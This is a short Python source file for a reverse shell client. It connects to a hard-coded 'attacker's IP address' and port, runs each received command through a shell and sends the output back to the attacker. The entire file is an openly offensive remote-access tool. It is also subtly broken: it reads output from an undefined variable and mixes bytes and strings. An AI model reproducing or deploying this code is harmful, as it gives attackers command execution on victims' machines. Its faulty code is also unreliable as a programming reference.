import socket
import subprocess, os

HOST = "132.67.1.72" # attacker's IP address (this one is just an example)
PORT = 12345 # attacker's port on whitch server is listening

# same syntax here as for the folder
connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))

while True:

	command = connexion_socket.recv(1024)

	if (command == "quit"):
		break

	# dealing with a command that does not work with subprocess.Popen()
	if(command.split()[0] == "cd"):
		# command.split takes the second word typed (= the directory we want to move to)
		os.chdir(command.split()[1])
		connexion_socket.send(("Changed directory to " + os.getcwd()))

	else:
	     # executes command line, making sure to get the output (more detalis about subprocess.Popen()
	     shell_execution = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	     stdout_value = proc.stdout.read() + proc.stderr.read() # retrives command output
	     connexion_socket.send(stdout_value)  # sends the output back to the attackers	

connexion_socket.close()	     